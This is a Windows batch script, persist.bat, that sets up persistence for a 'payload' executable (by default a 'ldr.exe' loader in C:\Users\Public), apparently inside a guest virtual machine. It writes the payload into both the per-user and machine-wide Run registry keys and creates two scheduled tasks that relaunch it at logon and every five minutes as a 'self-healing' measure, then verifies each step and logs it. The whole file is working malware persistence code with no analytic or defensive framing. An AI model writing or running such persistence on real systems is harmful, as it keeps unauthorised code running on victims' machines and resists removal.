@echo off
REM persist.bat - guest-side persistence setup. Arg %1 = full path of the payload.
REM Two independent mechanisms (both work in this guest; schtasks /create returns SUCCESS):
REM   HKCU/HKLM Run  -> start on user logon
REM   schtasks       -> start on logon + every 5 minutes (self-healing)
REM Combined with the loader's single-instance mutex this cannot pile up processes.
setlocal
set EXE=%~1
if "%EXE%"=="" set EXE=C:\Users\Public\ldr.exe
set OUT=C:\Users\Public\persist.txt
del "%OUT%" 2>nul
echo == payload %EXE% >> "%OUT%"
echo == HKCU Run >> "%OUT%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs /t REG_SZ /d "%EXE%" /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == HKLM Run >> "%OUT%"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs /t REG_SZ /d "%EXE%" /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == task onlogon >> "%OUT%"
schtasks /create /tn lcs_onlogon /tr "%EXE%" /sc onlogon /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == task every 5 min >> "%OUT%"
schtasks /create /tn lcs_5min /tr "%EXE%" /sc minute /mo 5 /f >> "%OUT%" 2>&1
echo rc=%ERRORLEVEL% >> "%OUT%"
echo == verify >> "%OUT%"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs >> "%OUT%" 2>&1
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v lcs >> "%OUT%" 2>&1
schtasks /query /tn lcs_onlogon /fo list | findstr /C:"TaskName" /C:"Status" >> "%OUT%" 2>&1
schtasks /query /tn lcs_5min /fo list | findstr /C:"TaskName" /C:"Status" >> "%OUT%" 2>&1
echo == end %TIME% >> "%OUT%"
endlocal
